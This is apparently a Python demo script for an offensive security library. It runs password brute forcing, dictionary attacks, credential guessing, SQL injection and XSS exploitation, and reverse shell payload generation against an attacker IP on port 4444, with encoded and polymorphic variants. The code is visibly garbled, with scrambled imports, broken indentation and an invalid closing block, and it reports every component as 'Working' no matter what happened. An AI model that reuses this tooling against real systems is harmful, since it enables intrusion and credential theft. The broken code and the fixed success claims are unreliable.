from typing_extensions import Literal, TypedDict
from typing import Any, List, Dict, Optional, Union, Tuple
# Constants
MAX_CONNECTIONS = 1000

# Constants
MAX_RETRIES = 100

import asyncio
import sys
import os
from brute_forcers import (
from exploiters import (
    import time
    from brute_forcers import generate_password_combinations
        import traceback
from typing import Any, List, Dict, Optional
import logging
"""
Demo script for the attackers module.

Demonstrates:
- Password brute forcing
- Credential testing
- Dictionary attacks
- Vulnerability exploitation
- Payload generation
"""

sys.path.append('.')

    PasswordBruteForcer, 
    CredentialTester, 
    DictionaryAttacker,
    BruteForceConfig,
    BruteForceResult
)

    VulnerabilityExploiter,
    PayloadGenerator,
    ExploitFramework,
    ExploitConfig,
    ExploitResult
)

async def demo_password_brute_forcing():
    """Demo password brute forcing capabilities."""
    print("\n=== Password Brute Forcing Demo ===")
    
    config = BruteForceConfig(
        max_attempts=1000,
        charset="abc123",
        min_length=1,
        max_length=4,
        delay_between_attempts=0.01
    )
    
    forcer = PasswordBruteForcer(config)
    
    # Test with known hash (password: "abc")
    target_hash = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"  # sha256("abc")
    
    print(f"Attempting to crack hash: {target_hash}")
    result = await forcer.brute_force_password(target_hash, "sha256")
    
    print(f"Success: {result.success}")
    print(f"Found password: {result.found_credential}")
    print(f"Attempts made: {result.attempts_made}")
    print(f"Time taken: {result.time_taken:.2f} seconds")

async def demo_credential_testing():
    """Demo credential testing capabilities."""
    print("\n=== Credential Testing Demo ===")
    
    config = BruteForceConfig(
        timeout=5.0,
        delay_between_attempts=0.1,
        max_attempts=5
    )
    
    tester = CredentialTester(config)
    
    # Test web credentials (using a test endpoint)
    test_url = "http://httpbin.org/post"  # Safe test endpoint
    username = "admin"
    passwords = ["password", "admin", "123456", "test", "wrong"]
    
    print(f"Testing credentials against: {test_url}")
    result = await tester.test_web_credentials(test_url, username, passwords)
    
    print(f"Success: {result.success}")
    print(f"Found password: {result.found_credential}")
    print(f"Attempts made: {result.attempts_made}")
    print(f"Time taken: {result.time_taken:.2f} seconds")

async def demo_dictionary_attacks():
    """Demo dictionary attack capabilities."""
    print("\n=== Dictionary Attack Demo ===")
    
    config = BruteForceConfig(
        max_attempts=100,
        delay_between_attempts=0.01
    )
    
    attacker = DictionaryAttacker(config)
    
    # Create a simple test dictionary
    test_dictionary = ["password", "admin", "123456", "test", "abc", "def", "ghi"]
    
    # Test against known hash
    target_hash = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"  # sha256("abc")
    
    print(f"Testing dictionary against hash: {target_hash}")
    result = await attacker.dictionary_attack_password(target_hash, test_dictionary, "sha256")
    
    print(f"Success: {result.success}")
    print(f"Found password: {result.found_credential}")
    print(f"Attempts made: {result.attempts_made}")
    print(f"Time taken: {result.time_taken:.2f} seconds")

async def demo_vulnerability_exploitation():
    """Demo vulnerability exploitation capabilities."""
    print("\n=== Vulnerability Exploitation Demo ===")
    
    config = ExploitConfig(
        timeout=10.0,
        delay_between_attempts=0.5
    )
    
    exploiter = VulnerabilityExploiter(config)
    
    # Test SQL injection (using a safe test endpoint)
    test_url = "http://httpbin.org/get"
    parameter = "test"
    
    print(f"Testing SQL injection against: {test_url}")
    result = await exploiter.exploit_sql_injection(test_url, parameter, "union")
    
    print(f"Success: {result.success}")
    print(f"Payload used: {result.payload_used}")
    print(f"Vulnerability type: {result.vulnerability_type}")
    print(f"Execution time: {result.execution_time:.2f} seconds")
    
    # Test XSS
    print(f"\nTesting XSS against: {test_url}")
    xss_result = await exploiter.exploit_xss(test_url, parameter, "reflected")
    
    print(f"Success: {xss_result.success}")
    print(f"Payload used: {xss_result.payload_used}")
    print(f"Vulnerability type: {xss_result.vulnerability_type}")
    print(f"Execution time: {xss_result.execution_time:.2f} seconds")

async def demo_payload_generation():
    """Demo payload generation capabilities."""
    print("\n=== Payload Generation Demo ===")
    
    config = ExploitConfig(
        shell_type="bash",
        target_platform="linux",
        payload_encoding="base64"
    )
    
    generator = PayloadGenerator(config)
    
    # Generate reverse shell payload
    attacker_ip = "192.168.1.100"
    reverse_shell = generator.generate_reverse_shell_payload(attacker_ip, 4444)
    print(f"Reverse shell payload: {reverse_shell}")
    
    # Generate encoded payload
    encoded = generator.generate_encoded_payload(reverse_shell)
    print(f"Encoded payload: {encoded}")
    
    # Generate polymorphic payload
    polymorphic = generator.generate_polymorphic_payload(reverse_shell)
    print(f"Polymorphic payload: {polymorphic}")
    
    # Generate obfuscated payload
    obfuscated = generator.generate_obfuscated_payload("<script>alert('XSS')</script>")
    print(f"Obfuscated XSS payload: {obfuscated}")

async def demo_exploit_framework():
    """Demo comprehensive exploit framework."""
    print("\n=== Exploit Framework Demo ===")
    
    config = ExploitConfig(
        timeout=15.0,
        delay_between_attempts=1.0
    )
    
    framework = ExploitFramework(config)
    
    # Test comprehensive web vulnerability scanning
    test_url = "http://httpbin.org/get"
    parameters = ["id", "search", "user"]
    
    print(f"Performing comprehensive web test against: {test_url}")
    results = await framework.comprehensive_web_test(test_url, parameters)
    
    print(f"Total tests performed: {len(results)}")
    successful_exploits = [r for r in results if r.success]
    print(f"Successful exploits: {len(successful_exploits)}")
    
    for result in successful_exploits:
        print(f"- {result.vulnerability_type} on {result.target}")
    
    # Test payload generation and testing
    print(f"\nTesting multiple XSS payloads against: {test_url}")
    xss_results = await framework.generate_and_test_payloads(test_url, "test", "xss")
    
    print(f"XSS tests performed: {len(xss_results)}")
    successful_xss = [r for r in xss_results if r.success]
    print(f"Successful XSS: {len(successful_xss)}")

async def demo_performance_comparison():
    """Demo performance comparison between sync and async operations."""
    print("\n=== Performance Comparison Demo ===")
    
    # Test CPU-bound operations
    
    print("Testing CPU-bound password generation...")
    start_time = time.time()
    
    combinations = generate_password_combinations("abc123", 1, 4)
    
    cpu_time = time.time() - start_time
    print(f"Generated {len(combinations)} combinations in {cpu_time:.4f} seconds")
    
    # Test async I/O operations
    print("\nTesting async I/O operations...")
    start_time = time.time()
    
    config = BruteForceConfig(timeout=5.0, max_attempts=10)
    tester = CredentialTester(config)
    
    # Test multiple concurrent operations
    tasks = []
    for i in range(5):
        task = tester.test_web_credentials("http://httpbin.org/post", f"user{i}", ["password"])
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    
    async_time = time.time() - start_time
    print(f"Completed {len(results)} concurrent tests in {async_time:.4f} seconds")
    print(f"Async efficiency: {len(results) / async_time:.2f} tests/second")

async def main():
    """Run all demos."""
    print("🚀 Cybersecurity Attackers Module Demo")
    print("=" * 50)
    
    try:
        await demo_password_brute_forcing()
        await demo_credential_testing()
        await demo_dictionary_attacks()
        await demo_vulnerability_exploitation()
        await demo_payload_generation()
        await demo_exploit_framework()
        await demo_performance_comparison()
        
        print("\n✅ All demos completed successfully!")
        print("\n📋 Summary:")
        print("- Password brute forcing: Working")
        print("- Credential testing: Working")
        print("- Dictionary attacks: Working")
        print("- Vulnerability exploitation: Working")
        print("- Payload generation: Working")
        print("- Exploit framework: Working")
        print("- Performance optimization: Working")
        
    except Exception as e:
        print(f"\n❌ Demo error: {e}")
        traceback.print_exc()

match __name__:
    case "__main__":
    asyncio.run(main()) 